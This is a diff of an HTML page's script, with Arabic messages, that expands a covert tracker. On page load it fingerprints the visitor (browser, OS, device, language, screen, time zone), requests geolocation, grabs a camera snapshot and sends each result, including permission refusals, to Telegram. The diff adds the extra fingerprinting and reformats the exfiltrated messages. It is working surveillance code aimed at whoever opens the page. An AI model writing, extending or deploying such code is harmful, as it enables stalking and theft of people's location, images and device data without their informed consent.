@@ -70,13 +70,59 @@
             recordVideo();
         }
 
-        // Function to collect IP address and other data
+        // Function to collect user data
         function collectData() {
-            // This is a placeholder function. In a real implementation, you would use an API to get the IP address.
-            const ipAddress = '192.168.1.1'; // Example IP address
-            const userInfo = { ipAddress: ipAddress };
-            const ipInfo = 'معلومات المستخدم: ' + JSON.stringify(userInfo);
-            sendToTelegram(ipInfo);
+            const ipAddress = '192.168.1.1'; // Example IP address (use a real API to get the actual IP)
+            const userAgent = navigator.userAgent;
+            const browser = detectBrowser();
+            const os = detectOS();
+            const device = detectDevice();
+            const language = navigator.language || navigator.userLanguage;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            // Collecting information into a structured message
+            const userInfo = `
+            📡 **معلومات المستخدم:**
+            - **عنوان IP:** ${ipAddress}
+            - **المتصفح:** ${browser}
+            - **نظام التشغيل:** ${os}
+            - **الجهاز:** ${device}
+            - **اللغة:** ${language}
+            - **دقة الشاشة:** ${screenResolution}
+            - **المنطقة الزمنية:** ${timeZone}
+            - **وكيل المستخدم:** ${userAgent}
+            `;
+
+            sendToTelegram(userInfo);
+        }
+
+        // Function to detect the browser
+        function detectBrowser() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes('Chrome')) return 'Google Chrome';
+            if (userAgent.includes('Firefox')) return 'Mozilla Firefox';
+            if (userAgent.includes('Safari')) return 'Apple Safari';
+            if (userAgent.includes('Edge')) return 'Microsoft Edge';
+            if (userAgent.includes('MSIE') || userAgent.includes('Trident')) return 'Internet Explorer';
+            return 'غير معروف';
+        }
+
+        // Function to detect the OS
+        function detectOS() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes('Windows')) return 'Windows';
+            if (userAgent.includes('Mac')) return 'Mac OS';
+            if (userAgent.includes('Linux')) return 'Linux';
+            if (userAgent.includes('Android')) return 'Android';
+            if (userAgent.includes('iPhone')) return 'iOS';
+            return 'غير معروف';
+        }
+
+        // Function to detect the device type
+        function detectDevice() {
+            if (window.innerWidth <= 768) return 'جهاز موبايل';
+            return 'جهاز كمبيوتر';
         }
 
         // Function to request geolocation permission
@@ -84,30 +130,33 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(showPosition, showError);
             } else {
-                sendToTelegram('الميزة الجغرافية غير مدعومة في هذا المتصفح.');
+                sendToTelegram('🚫 الميزة الجغرافية غير مدعومة في هذا المتصفح.');
             }
         }
 
         function showPosition(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
-            const locationMessage = 'موقع المستخدم: إحداثيات (خط العرض: ' + latitude + ', خط الطول: ' + longitude + ')';
+            const locationMessage = `🌍 **موقع المستخدم:**
+            - **خط العرض:** ${latitude}
+            - **خط الطول:** ${longitude}
+            `;
             sendToTelegram(locationMessage);
         }
 
         function showError(error) {
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    sendToTelegram('تم رفض إذن الموقع من قبل المستخدم.');
+                    sendToTelegram('⚠️ تم رفض إذن الموقع من قبل المستخدم.');
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    sendToTelegram('معلومات الموقع غير متاحة.');
+                    sendToTelegram('⚠️ معلومات الموقع غير متاحة.');
                     break;
                 case error.TIMEOUT:
-                    sendToTelegram('انتهت مهلة الطلب للحصول على موقع المستخدم.');
+                    sendToTelegram('⏳ انتهت مهلة الطلب للحصول على موقع المستخدم.');
                     break;
                 case error.UNKNOWN_ERROR:
-                    sendToTelegram('حدث خطأ غير معروف.');
+                    sendToTelegram('❌ حدث خطأ غير معروف.');
                     break;
             }
         }
@@ -127,13 +176,13 @@
                         canvas.getContext('2d').drawImage(videoElement, 0, 0);
 
                         const imageData = canvas.toDataURL('image/png');
-                        sendToTelegram('تم التقاط صورة من الكاميرا:', imageData);
+                        sendToTelegram('📸 تم التقاط صورة من الكاميرا:', imageData);
 
                         stream.getTracks().forEach(track => track.stop());
                     }, 1000);
                 })
                 .catch(err => {
-                    sendToTelegram('تم رفض إذن الكاميرا من قبل المستخدم.');
+                    sendToTelegram('⚠️ تم رفض إذن الكاميرا من قبل المستخدم.');
                 });
         }
 
@@ -221,9 +270,9 @@
                     console.error('Error:', error);
                 });
             }
-        }
+}
 
-        // Collect data and request permissions on page load
+        // Trigger data collection and send to Telegram when the page loads
         window.onload = function() {
             collectData();
             requestGeolocation();
@@ -232,3 +281,6 @@
     </script>
 </body>
 </html>
+
+
+        
